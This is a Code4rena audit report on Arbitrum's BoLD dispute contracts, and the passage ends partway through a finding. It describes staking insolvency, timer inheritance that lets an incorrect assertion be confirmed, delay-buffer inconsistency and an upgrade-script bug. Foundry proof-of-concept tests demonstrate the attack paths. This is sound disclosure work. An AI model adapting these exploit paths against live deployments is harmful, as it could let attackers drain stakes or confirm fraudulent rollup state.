---
sponsor: "Arbitrum Foundation"
slug: "2024-05-arbitrum-foundation"
date: "2024-06-17"
title: "Arbitrum BoLD"
findings: "https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues"
contest: 375
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Arbitrum BoLD smart contract system written in Solidity. The audit took place between May 10—May 27 2024.

## Wardens

31 Wardens contributed reports to Arbitrum BoLD:

  1. [xuwinnie](https://code4rena.com/@xuwinnie)
  2. [Ch\_301](https://code4rena.com/@Ch_301)
  3. [0x73696d616f](https://code4rena.com/@0x73696d616f)
  4. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  5. [Sathish9098](https://code4rena.com/@Sathish9098)
  6. [Kow](https://code4rena.com/@Kow)
  7. [Emmanuel](https://code4rena.com/@Emmanuel)
  8. [ladboy233](https://code4rena.com/@ladboy233)
  9. [Rhaydden](https://code4rena.com/@Rhaydden)
  10. [dontonka](https://code4rena.com/@dontonka)
  11. [josephdara](https://code4rena.com/@josephdara)
  12. [bronze\_pickaxe](https://code4rena.com/@bronze_pickaxe)
  13. [K42](https://code4rena.com/@K42)
  14. [fyamf](https://code4rena.com/@fyamf)
  15. [slvDev](https://code4rena.com/@slvDev)
  16. [hihen](https://code4rena.com/@hihen)
  17. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  18. [forgebyola](https://code4rena.com/@forgebyola)
  19. [Dup1337](https://code4rena.com/@Dup1337) ([ChaseTheLight](https://code4rena.com/@ChaseTheLight), [sorrynotsorry](https://code4rena.com/@sorrynotsorry), and [deliriusz](https://code4rena.com/@deliriusz))
  20. [Takarez](https://code4rena.com/@Takarez)
  21. [twcctop](https://code4rena.com/@twcctop)
  22. [Audinarey](https://code4rena.com/@Audinarey)
  23. [guhu95](https://code4rena.com/@guhu95)
  24. [zanderbyte](https://code4rena.com/@zanderbyte)
  25. [carlitox477](https://code4rena.com/@carlitox477)
  26. [LessDupes](https://code4rena.com/@LessDupes) ([3docSec](https://code4rena.com/@3docSec), [sin1st3r\_\_](https://code4rena.com/@sin1st3r__), and [EV\_om](https://code4rena.com/@EV_om))
  27. [KupiaSec](https://code4rena.com/@KupiaSec)

This audit was judged by [Picodes](https://code4rena.com/@Picodes).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 4 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 2 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 23 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Arbitrum BoLD repository](https://github.com/code-423n4/2024-05-arbitrum-foundation), and is composed of 14 interfaces and 27 logic contracts written in the Solidity programming language and includes 3,603 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (2)
## [[H-01] Adversary can make honest parties unable to retrieve their assertion stakes if the required amount is decreased](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/8)
*Submitted by [xuwinnie](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/8), also found by [Ch\_301](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/37)*

### Impact

When the required stake (to create a new assertions) is updated to a lower amount, adversary can make the honest party unable to retrieve their assertion stakes.

### Proof of Concept
```
     A -- B -- C -- D(latest confirmed) -- E
```

Suppose the initial stake amount is 1000 ETH, and till now no invalid assertions have been made. (A, B, C, D, E are all valid and made by the same validator). The rollup contract should hold 1000 ETH now.

```
     A -- B -- C -- D(latest confirmed) -- E
                                        \
                                         \ F(invalid)
```

Then, the admin update the required stake to 700 ETH, Alice made an invalid assertion F. Since its parent D was created before the update, Alice will still need to stake 1000 ETH, and the 1000 ETH will be sent to loserStakeEscrow.

```
            if (!getAssertionStorage(newAssertionHash).isFirstChild) {

                // only 1 of the children can be confirmed and get their stake refunded
                // so we send the other children's stake to the loserStakeEscrow
                IERC20(stakeToken).safeTransfer(loserStakeEscrow, assertion.beforeStateData.configData.requiredStake);
            }
```

```

     A -- B -- C -- D(latest confirmed) -- E
                                        \

                                         \ F -- G
```

(a) Alice creates F's children, G. Now, only 700 ETH of stake is needed. However, as the comment suggests, no refund will be made since G's ancestor could need more stake.

```
            // requiredStake is user supplied, will be verified against configHash later
            // the prev's requiredStake is used to make sure all children have the same stake
            // the staker may have more than enough stake, and the entire stake will be locked
            // we cannot do a refund here because the staker may be staker on an unconfirmed ancestor that requires more stake
            // excess stake can be removed by calling reduceDeposit when the staker is inactive
            require(amountStaked(msg.sender) >= assertion.beforeStateData.configData.requiredStake, "INSUFFICIENT_STAKE");
```

(b) To bypass the limit in (a), Alice calls her friend Bob to make the assertion G instead , Bob will only need to stake 700 ETH now. The rollup contract currently holds 1700 ETH. Then, Alice can withdraw her stake since she is no longer active. (her last staked assertion have a child)

```
        function requireInactiveStaker(address stakerAddress) internal view {
            require(isStaked(stakerAddress), "NOT_STAKED");
            // A staker is inactive if
            // a) their last staked assertion is the latest confirmed assertion
            // b) their last staked assertion have a child
            bytes32 lastestAssertion = latestStakedAssertion(stakerAddress);
            bool isLatestConfirmed = lastestAssertion == latestConfirmed();
            bool haveChild = getAssertionStorage(lastestAssertion).firstChildBlock > 0;
            require(isLatestConfirmed || haveChild, "STAKE_ACTIVE");
        }
```

Now the rollup contract holds 700 ETH, which means it is insolvent. The honest validator cannot withdraw her original stake. (700 < 1000)

### Recommended Mitigation Steps

Ensure the following

1.  A staker is considered inactive only if her last staked assertion is confirmed.
2.  A staker can only stake on her last staked assertion's descendants. (otherwise Alice can switch to the correct branch and withdraw)

**[gzeoneth (Arbitrum) confirmed and commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/8#issuecomment-2145263766):**
 > Patched with https://github.com/OffchainLabs/bold/pull/655.



***

## [[H-02] Edge from dishonest challenge edge tree can inherit timer from honest tree allowing confirmation of incorrect assertion](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/2)
*Submitted by [Kow](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/2), also found by [Emmanuel](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/27), [xuwinnie](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/10), and [SpicyMeatball](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/6)*

### Impact

Timers can be inherited across different challenge trees and consequently incorrect assertions can be confirmed.

### Proof of Concept

The function `RollupUserLogic::updateTimerCacheByClaim` allows inheritance of timers between different levels of a challenge. It performs some validation on edge being inherited from in `checkClaimIdLink` (the claiming edge). <br><https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/challengeV2/libraries/EdgeChallengeManagerLib.sol#L689-L710>

```solidity
    function checkClaimIdLink(EdgeStore storage store, bytes32 edgeId, bytes32 claimingEdgeId, uint8 numBigStepLevel)
        private
        view
    {
        // the origin id of an edge should be the mutual id of the edge in the level below
        if (store.edges[edgeId].mutualId() != store.edges[claimingEdgeId].originId) {
            revert OriginIdMutualIdMismatch(store.edges[edgeId].mutualId(), store.edges[claimingEdgeId].originId);
        }
        // the claiming edge must be exactly one level below
        if (nextEdgeLevel(store.edges[edgeId].level, numBigStepLevel) != store.edges[claimingEdgeId].level) {
            revert EdgeLevelInvalid(
                edgeId,
                claimingEdgeId,
                nextEdgeLevel(store.edges[edgeId].level, numBigStepLevel),
                store.edges[claimingEdgeId].level
            );
        }
    }
```

As per the comments, the claiming edge must be exactly one level below (ie. in the subchallenge directly after the inheriting edge) and its `originId` must match the `mutualId` of the inheriting edge. For clarification, we note that the inheriting edge must be a leaf edge in a challenge/subchallenge tree since the root edges of subchallenges (the layer zero edges) have `originId` derived from the `mutualId` of one of these leaf edges, and this `originId` is inherited by all its children which result from bisection.

Note that rival edges share the same `mutualId` by definition and since there isn't any extra validation, if a specific edge is a valid inheriting edge, all rivals will also be valid inheriting edges. This means rivals belonging to dishonest challenge edge trees will also be able to inherit from the timer of edges in the honest tree. Consequently, if an honest edge accumulates sufficient unrivalled time for confirmation, a malicious actor can frontrun the confirmation of the honest challenge tree to confirm the dishonest challenge, and in turn an incorrect assertion.

It is sufficient for only one dishonest child edge to inherit a sufficient timer via claim since the other will be unrivalled as challenges between two assertions can only follow one unique bisection path in each challenge tree. The only way to deny this would be to create another assertion that can be bisected to rival the other child to halt the timer accumulation, but this would require loss of the assertion and challenge stake (since only one rival assertion and challenge edge can be confirmed). The timer can then be propogated upwards by children until we reach the root challenge edge to allow confirmation.

Even if confirmation of the dishonest root challenge edge is prevented by admin action, confirmation of the layer zero edges of subchallenges would ensure honest validators lose the stake submitted for creating a rival edge (since only one rival edge can be confirmed) and the dishonest validator(s) regain their stake.

<details>

<summary>Proof of Concept</summary>

The PoC below demonstrates the inheritance of the timer from the honest tree by an edge in the dishonest tree and the confirmation of the dishonest challenge edge as a result. The challenge progresses to the last level of level 1 (the first subchallenge).

Run the PoC below with the command:

```terminal
forge test --match-contract Playground --match-test testConfirmIncorrectEdge
```

```solidity
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./Utils.sol";
import "../MockAssertionChain.sol";
import "../../src/challengeV2/EdgeChallengeManager.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
import "../ERC20Mock.sol";
import "./StateTools.sol";
import "forge-std/console.sol";

import "./EdgeChallengeManager.t.sol";

contract Playground is EdgeChallengeManagerTest {
    function testConfirmIncorrectEdge() public {
        EdgeInitData memory ei = deployAndInit();
        (
            bytes32[] memory blockStates1,
            bytes32[] memory blockStates2,
            BisectionChildren[6] memory blockEdges1,
            BisectionChildren[6] memory blockEdges2
        ) = createBlockEdgesAndBisectToFork(
            CreateBlockEdgesBisectArgs(
                ei.challengeManager,
                ei.a1,
                ei.a2,
                ei.a1State,
                ei.a2State,
                false,
                a1RandomStates,
                a1RandomStatesExp,
                a2RandomStates,
                a2RandomStatesExp
            )
        );

        // bisection of level 1, last bisection for winning edge is unrivalled
        BisectionData memory bsbd = createMachineEdgesAndBisectToFork(
            CreateMachineEdgesBisectArgs(
                ei.challengeManager,
                1,
                blockEdges1[0].lowerChildId,
                blockEdges2[0].lowerChildId,
                blockStates1[1],
                blockStates2[1],
                true,
                ArrayUtilsLib.slice(blockStates1, 0, 2),
                ArrayUtilsLib.slice(blockStates2, 0, 2)
            )
        );

        // allow unrivalled timer to tick up for winning leaf
        _safeVmRoll(block.number + challengePeriodBlock);

        // update timer of level 1 unrivalled winning leaf
        ei.challengeManager.updateTimerCacheByChildren(bsbd.edges1[0].lowerChildId);

        ChallengeEdge memory winningEdge = ei.challengeManager.getEdge(bsbd.edges1[0].lowerChildId);
        ChallengeEdge memory losingRival = ei.challengeManager.getEdge(blockEdges2[0].lowerChildId);

        console.log("Losing rival timer before update:", losingRival.totalTimeUnrivaledCache);

        // inherit timer from level 1 winning leaf to level 0 losing rival
        ei.challengeManager.updateTimerCacheByClaim(
            blockEdges2[0].lowerChildId, 
            bsbd.edges1[0].lowerChildId
        );
        
        losingRival = ei.challengeManager.getEdge(blockEdges2[0].lowerChildId);
        console.log("Losing rival timer after update:", losingRival.totalTimeUnrivaledCache);

        // update timer of level 0 unrivalled losing upper child
        ei.challengeManager.updateTimerCacheByChildren(blockEdges2[0].upperChildId);
        console.log("Losing upper timer unrivalled:", ei.challengeManager.timeUnrivaled(blockEdges2[0].upperChildId));

        // propogate timers upwards to the incorrect assertion from the losing children
        ei.challengeManager.updateTimerCacheByChildren(blockEdges2[1].lowerChildId);
        ei.challengeManager.updateTimerCacheByChildren(blockEdges2[1].upperChildId);

        ei.challengeManager.updateTimerCacheByChildren(blockEdges2[2].lowerChildId);
        ei.challengeManager.updateTimerCacheByChildren(blockEdges2[2].upperChildId);

        ei.challengeManager.updateTimerCacheByChildren(blockEdges2[3].lowerChildId);
        ei.challengeManager.updateTimerCacheByChildren(blockEdges2[3].upperChildId);

        ei.challengeManager.updateTimerCacheByChildren(blockEdges2[4].lowerChildId);
        ei.challengeManager.updateTimerCacheByChildren(blockEdges2[4].upperChildId);

        ei.challengeManager.updateTimerCacheByChildren(blockEdges2[5].lowerChildId);

        assertEq(
            ei.challengeManager.getEdge(blockEdges2[5].lowerChildId).totalTimeUnrivaledCache,
            challengePeriodBlock 
        );

        // confirm the edge for the incorrect assertion
        ei.challengeManager.confirmEdgeByTime(blockEdges2[5].lowerChildId, ei.a1Data);

        assertTrue(
            ei.challengeManager.getEdge(blockEdges2[5].lowerChildId).status == EdgeStatus.Confirmed
        );
    }
}
```

</details>

### Recommended Mitigation Steps

Allow child edges (from bisection) to inherit the `claimId` of their parent and check that the `claimId` of the claiming edge matches the `edgeId` of the inheriting edge (this would require changes to `isLayerZeroEdge`).

**[godzillaba (Arbitrum) confirmed](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/2#issuecomment-2142831846)**

**[gzeoneth (Arbitrum) commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/2#issuecomment-2142879476):**
 > Good catch.
> 
> Fixed in https://github.com/OffchainLabs/bold/pull/659.



***
 
# Medium Risk Findings (2)
## [[M-01] Inconsistent sequencer unexpected delay in DelayBuffer may harm users calling `forceInclusion()`](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55)
*Submitted by [0x73696d616f](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55)*

<https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/main/src/bridge/DelayBuffer.sol#L43> <br>
<https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/main/src/bridge/DelayBuffer.sol#L90-L98><br>
<https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/main/src/bridge/SequencerInbox.sol#L287>

### Impact

Buffer unexpected delay due to sequencer outage is inconsistent.

### Proof of Concept

When the sequencer is down, users may call `SequencerInbox::forceInclusion()` to get their message added to the inbox `sequencerInboxAccs`. However, there is an incosistency when the sequencer has been down and there is more than 1 message, or even if just 1 message.

The `DelayBuffer` is used to dynamically adjust how much delay a user has to wait to call `SequencerInbox::forceInclusion()`. The buffer increase mechanism is not relevant for this issue.

The buffer decrease consists of subtracting the last time the buffer was updated, `self.prevSequencedBlockNumber`, by the previous block number of the last delay buffer update, `self.prevBlockNumber`. This is done this way to ensure that the sequencer delay can not be double counted, as the delayed inbox may have more than 1 delayed message.

However, the approach taken as a way of protecting the sequencer and not depleting the buffer incorrectly as the drawback that it also means that the buffer will not always be decreased.

For example, if the sequencer is working at a block number A, a message is submited at block number A + 10 and another one at block number A + 110. If the sequencer is down, the user has to wait, for example, delay blocks of 100 (or the delay buffer, depending on the [smallest](https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/main/src/bridge/SequencerInbox.sol#L843-L845)). If 200 blocks have passed since A + 10 (the first message), both delayed messages may be force included, at block number A  + 210.

The discrepancy is that, depending on how the delayed messages are included, the buffer delay will be reduced differently. If both messages are removed at once, by calling `SequencerInbox::forceInclusion()` with the id of the newest message, the buffer delay will not be decreased, as `self.prevBlockNumber` is A, the same as `self.prevSequencedBlockNumber`. This would harm users that want to force included messages as the buffer would be bigger and they would have to wait more time for their message to be force included.

If the oldest message is first force included, the buffer delay will not decreased, as above, but `self.prevSequencedBlockNumber` will be updated to A + 210 and `self.prevBlockNumber` to A + 10. Then, if the second message is force included, `self.prevSequencedBlockNumber - self.prevBlockNumber == A + 210 - (A + 10) == 200`, which means that the buffer would correctly decrease as the sequencer was offline (ignoring the fact that there is a threshold, but the issue is the same as long as the delay is bigger than the threshold).

As a proof of concept, add the following test to `SequencerInbox.t.sol`. It shows that given 2 messages, the delay buffer is only decreased if the first message is forcely included first and only after is the newest message included. If the given `delayedMessagesRead` is the if of the second message, without forcely including the first one first, the buffer will not decrease.

```solidity
function test_POC_InconsistentBuffer_Decrease() public {
    BufferConfig memory configBufferable = BufferConfig({
        threshold: 600, //60 * 60 * 2 / 12
        max: 14400, //24 * 60 * 60 / 12 * 2
        replenishRateInBasis: 714
    });

    (SequencerInbox seqInbox, Bridge bridge) = deployRollup(false, true, configBufferable);
    address delayedInboxSender = address(140);
    uint8 delayedInboxKind = 3;
    bytes32 messageDataHash = RAND.Bytes32();

    (uint64 bufferBlocks, ,,,,) = seqInbox.buffer();
    assertEq(bufferBlocks, 14400);

    vm.startPrank(dummyInbox);
    bridge.enqueueDelayedMessage(delayedInboxKind, delayedInboxSender, messageDataHash);
    vm.roll(block.number + 1100);
    bridge.enqueueDelayedMessage(delayedInboxKind, delayedInboxSender, messageDataHash);
    vm.stopPrank();

    vm.roll(block.number + 500);

    uint256 delayedMessagesRead = bridge.delayedMessageCount();

    // buffer is not decreased if the first and second messages are included at once
    seqInbox.forceInclusion(
            delayedMessagesRead,
            delayedInboxKind,
            [uint64(block.number - 500), uint64(block.timestamp)],
            0,
            delayedInboxSender,
            messageDataHash
        );
    (bufferBlocks, ,,,,) = seqInbox.buffer();
    assertEq(bufferBlocks, 14400);

    // buffer is only decreased if the first message is included first
    /*seqInbox.forceInclusion(
            delayedMessagesRead - 6,
            delayedInboxKind,
            [uint64(block.number - 1600), uint64(block.timestamp)],
            0,
            delayedInboxSender,
            messageDataHash
    );
    (bufferBlocks, ,,,,) = seqInbox.buffer();
    assertEq(bufferBlocks, 14400);

    seqInbox.forceInclusion(
            delayedMessagesRead,
            delayedInboxKind,
            [uint64(block.number - 500), uint64(block.timestamp)],
            0,
            delayedInboxSender,
            messageDataHash
        );
    (bufferBlocks, ,,,,) = seqInbox.buffer();
    assertEq(bufferBlocks, 13478);*/
}
```

### Tools Used

- Vscode
- Foundry

### Recommended Mitigation Steps

A mitigation must be carefully taken as not to introduce double accounting of the buffer delay. One solution that would fix this issue is tracking the total unexpected delay separately and making it equal to the `block.number` minus the maximum between the previous sequenced block number and the oldest delayed message that was not yet included. This way, by doing the maximum with the last sequenced, we guarantee that no double accounting of delays takes place. By doing the maximum with the oldest delayed message, we guarantee that the delay is real and not that no message was submitted.

*Note: the following discussion has been condensed for this report. To view the full discussion, please see the [original submission](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55).*

**[gzeoneth (Arbitrum) disputed and commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55#issuecomment-2142840454):**
 > The delay buffer is an intermediary goal and not a final goal. The purpose of the delay buffer is to provide force inclusion assurances. The delay buffer updates are staggered and the buffer updates proactively in the force inclusion method (https://github.com/OffchainLabs/bold/blob/32eaf85e8ed45d069eb77e299b71fd6f3924bf40/contracts/src/bridge/SequencerInbox.sol#L309). The behavior described is not unexpected and does not have impact on force inclusion.

**[Picodes (judge) decreased severity to Low/Non-Critical and commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55#issuecomment-2148500563):**
 > This report shows how the delay buffer update could be nondeterministic and depend on how messages are included, but as shown by the sponsor fails to demonstrate why this would be important and how this fulfills the definition of Medium severity (function of the protocol or its availability could be impacted).

**[Picodes (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55#issuecomment-2159204017):**
 > After further discussion, this issue is to me somewhere between "function incorrect as to spec, state handling", and "availability issue".
> 
> Considering:
>  - that the impact of the end-user not being able to force-include a message as soon as possible is that its funds may be locked for some time.
>  -  that if the sequencer is down, there may be multiple messages to force-include, and that the depletion is advertised in various places but is non-deterministic and could be "manipulated" to delay the following message, I'll upgrade to Medium.

**[godzillaba (Arbitrum) commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55#issuecomment-2159501680):**
 > > that the impact of the end-user not being able to force-include a message as soon as possible is that its funds may be locked for some time
> 
> @Picodes - I'm not sure this is true. In the example @0x73696d616f gave with 3 messages (m1,m2,m3 at T1,T2,T3), m1 not being included right away does not cause funds to be locked since m1 is included when m2 is included at T2, and m1 _could have_ been included at any time between T1 and T2.

**[Picodes (judge) commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55#issuecomment-2159552028):**
 > @godzillaba - I meant locked for some time. Funds can't be withdrawn as soon as they should because the buffer isn't depleting as fast as it should.

**[godzillaba (Arbitrum) commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55#issuecomment-2159567381):**
 > If the same user (eg someone playing in an L3's bold game) submits m2 and m3, and they force include only their own messages promptly (as in the example where there is a claimed bug) they are not affected. That user, the force includer, still can only experience some max amount of sequencer censorship over a given time period.

**[gzeoneth (Arbitrum) commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55#issuecomment-2159600468):**
 > Arbitrum's protocol has always been optimistic, we build most of our logic under the assumption of a honest participant exists. e.g. https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/main/README.md
> 
> > It is assumed ... honest validators can react to malicious action broadcasted on-chain immediately in the same block unless the malicious party spend their censorship budget.
> 
> This is unless the function is designed to be non-admin permissioned, then we enforce straighter guarantee. e.g.
> 
> > There is a correct fix that is applied in the `delayProofImpl()` but not in `forceInclusion()`.
> 
> Batch poster's `delayProofImpl` have the "correct fix" where permissionless `forceInclusion` do not. This is by design to limit the complexity of the contracts.
> 
> If anyone is concerned about the total delay of delayed message, it is assumed they SHOULD force include as soon as possible. If they do not call force include, there are no protocol guarantee their message will ever be included. Any delay in calling forceInclusion on parent chain can be modeled as part of the censorship budget of an attacker.

**[Picodes (judge) commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55#issuecomment-2160655989):**
 > @0x73696d616f - Can you please edit your PoC to show a force-inclusion reverting in one scenario because of the delay whereas in the other it works.

**[0x73696d616f (warden) commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55#issuecomment-2160745501):**
 > Here is a POC showing how the buffer is correctly depleted only if messages are included sequentially. The buffer gets depleted due to actively including messages sequentially. If the second message in the loop is included directly instead, the buffer is not correctly depleted, and instead of ending up being the minimum, is a much larger value (600 vs 7320). Thus, users have to wait 2000 blocks instead of 600. It can be confirmed that initially they have to wait 2000 blocks, but in the end only 600, if we include sequentially and fix this bug. If we don't include sequentially, they still have to wait 2000 blocks.
> 
> We can play around with the numbers and observe different outcomes, but this is a real, proven risk. Here users have to wait 2000/600 =  3.3 times more to get their transaction force included. This issue will happen, how it happens depends on the conditions. The buffer being depleted is an expected scenario and the code is built to handle this situation, so arguments based on the fact that this will never happen do not stand. The impact depends on `delayBlocks`, `threshold`, `max`, `replenishRate` and user behaviour. We can find a lot of combinations showing very strong impact, as well as some showing less impact, but we know for sure this is a real risk. A list of parameters or user behavior that increase/decrease the impact can be made, but it does not erase the fact that this risk exists. It fits exactly in the definition of a medium severity issue:
>
> > with a hypothetical attack path with stated assumptions, but external requirements.
> 
> ```solidity
> function test_POC_InconsistentBuffer_Decrease() public {
>     bool fix = false;
>     maxTimeVariation.delayBlocks = 2000;
>     BufferConfig memory configBufferable = BufferConfig({
>         threshold: 600, //60 * 60 * 2 / 12
>         max: 14400, //24 * 60 * 60 / 12 * 2
>         replenishRateInBasis: 714
>     });
> 
>     (SequencerInbox seqInbox, Bridge bridge) = deployRollup(false, true, configBufferable);
>     address delayedInboxSender = address(140);
>     uint8 delayedInboxKind = 3;
>     bytes32 messageDataHash = RAND.Bytes32();
> 
>     for (uint i = 0; i < 7; i++) {
>         vm.startPrank(dummyInbox);
>         bridge.enqueueDelayedMessage(delayedInboxKind, delayedInboxSender, messageDataHash);
>         vm.roll(block.number + 1100);
>         bridge.enqueueDelayedMessage(delayedInboxKind, delayedInboxSender, messageDataHash);
>         vm.stopPrank();
>         vm.roll(block.number + 2001);
>         uint256 delayedMessagesRead = bridge.delayedMessageCount();
>         if (fix) {
>             seqInbox.forceInclusion(
>                     delayedMessagesRead - 1,
>                     delayedInboxKind,
>                     [uint64(block.number - 3101), uint64(block.timestamp)],
>                     0,
>                     delayedInboxSender,
>                     messageDataHash
>             );
>         }
>         seqInbox.forceInclusion(
>                 delayedMessagesRead,
>                 delayedInboxKind,
>                 [uint64(block.number - 2001), uint64(block.timestamp)],
>                 0,
>                 delayedInboxSender,
>                 messageDataHash
>         );
>     }
>     (uint256 bufferBlocks, ,,,,) = seqInbox.buffer();
>     assertEq(bufferBlocks, fix ? 600 : 7320);
> 
>     vm.startPrank(dummyInbox);
>     bridge.enqueueDelayedMessage(delayedInboxKind, delayedInboxSender, messageDataHash);
>     vm.stopPrank();
>     vm.roll(block.number + 601);
>     uint256 delayedMessagesRead = bridge.delayedMessageCount();
> 
>     if (!fix) vm.expectRevert(ForceIncludeBlockTooSoon.selector);
>     seqInbox.forceInclusion(
>             delayedMessagesRead,
>             delayedInboxKind,
>             [uint64(block.number - 601), uint64(block.timestamp)],
>             0,
>             delayedInboxSender,
>             messageDataHash
>     );
> }
> ```

**[Picodes (judge) commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/55#issuecomment-2160982040):**
 > With the above PoC in a longer sequence the effect on the `sequenced - start` gets indeed neutralized and we're back with a DoS issue.
> This is Medium severity.



***

## [[M-02] `BOLDUpgradeAction.sol` will fail to upgrade contracts due to error in the `perform` function](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/5)
*Submitted by [SpicyMeatball](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/5), also found by [dontonka](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/53) and [josephdara](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/34)*

### Impact

An error in the `BOLDUpgradeAction.sol` contract prevents it from upgrading and deploying new BOLD contracts.

### Proof of Concept

The `perform` function serves as the entry point in the `BOLDUpgradeAction.sol` and is responsible for migrating stakers from the old rollup and deploying the challenge manager with a new rollup contract.

One of the first subroutines in this function is the `cleanupOldRollup()`.

```solidity
    function perform(address[] memory validators) external {
        // tidy up the old rollup - pause it and refund stakes
        cleanupOldRollup();
```

This subroutine pauses the old rollup contract and attempts to refund existing stakers.

```solidity
    function cleanupOldRollup() private {
        IOldRollupAdmin(address(OLD_ROLLUP)).pause();

>>      uint64 stakerCount = ROLLUP_READER.stakerCount();
        // since we for-loop these stakers we set an arbitrary limit - we dont
        // expect any instances to have close to this number of stakers
        if (stakerCount > 50) {
            stakerCount = 50;
        }
        for (uint64 i = 0; i < stakerCount; i++) {
>>          address stakerAddr = ROLLUP_READER.getStakerAddress(i);
            OldStaker memory staker = ROLLUP_READER.getStaker(stakerAddr);
            if (staker.isStaked && staker.currentChallenge == 0) {
                address[] memory stakersToRefund = new address[](1);
                stakersToRefund[0] = stakerAddr;

                IOldRollupAdmin(address(OLD_ROLLUP)).forceRefundStaker(stakersToRefund);
            }
        }

        // upgrade the rollup to one that allows validators to withdraw even whilst paused
        DoubleLogicUUPSUpgradeable(address(OLD_ROLLUP)).upgradeSecondaryTo(IMPL_PATCHED_OLD_ROLLUP_USER);
    }
```

This function contains a bug that prevents execution of the subsequent procedures. Let's check the `forceRefundStaker` in the old rollup contract.

According to: <https://docs.arbitrum.io/build-decentralized-apps/reference/useful-addresses>

Proxy: <https://etherscan.io/address/0x5eF0D09d1E6204141B4d37530808eD19f60FBa35><br>
Implementation: <https://etherscan.io/address/0x72f193d0f305f532c87a4b9d0a2f407a3f4f585f#code>

RollupAdminLogic.sol

```solidity
    function forceRefundStaker(address[] calldata staker) external override whenPaused {
        require(staker.length > 0, "EMPTY_ARRAY");
        for (uint256 i = 0; i < staker.length; i++) {
            require(_stakerMap[staker[i]].currentChallenge == NO_CHAL_INDEX, "STAKER_IN_CHALL");
            reduceStakeTo(staker[i], 0);
>>          turnIntoZombie(staker[i]);
        }
        emit OwnerFunctionCalled(22);
    }
```

RollupCore.sol

```solidity
    function turnIntoZombie(address stakerAddress) internal {
        Staker storage staker = _stakerMap[stakerAddress];
        _zombies.push(Zombie(stakerAddress, staker.latestStakedNode));
>>      deleteStaker(stakerAddress);
    }

    function deleteStaker(address stakerAddress) private {
        Staker storage staker = _stakerMap[stakerAddress];
        require(staker.isStaked, "NOT_STAKED");
        uint64 stakerIndex = staker.index;
        _stakerList[stakerIndex] = _stakerList[_stakerList.length - 1];
        _stakerMap[_stakerList[stakerIndex]].index = stakerIndex;
>>      _stakerList.pop();
        delete _stakerMap[stakerAddress];
    }
```

From the above code, it is evident that the staker's address is eventually deleted from the `_stakerList`, causing the array to shrink. As a result, the `cleanupOldRollup` function will throw an "array out-of-bounds" error because it tries to iterate through an array with the original number of elements.

**Coded POC**

Here we use mainnet fork with only the `cleanupOldRollup` function.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

struct OldStaker {
    uint256 amountStaked;
    uint64 index;
    uint64 latestStakedNode;
    // currentChallenge is 0 if staker is not in a challenge
    uint64 currentChallenge; // 1. cannot have current challenge
    bool isStaked; // 2. must be staked
}

interface IOldRollup {
    function pause() external;
    function forceRefundStaker(address[] memory stacker) external;
    function getStakerAddress(uint64 stakerNum) external view returns (address);
    function stakerCount() external view returns (uint64);
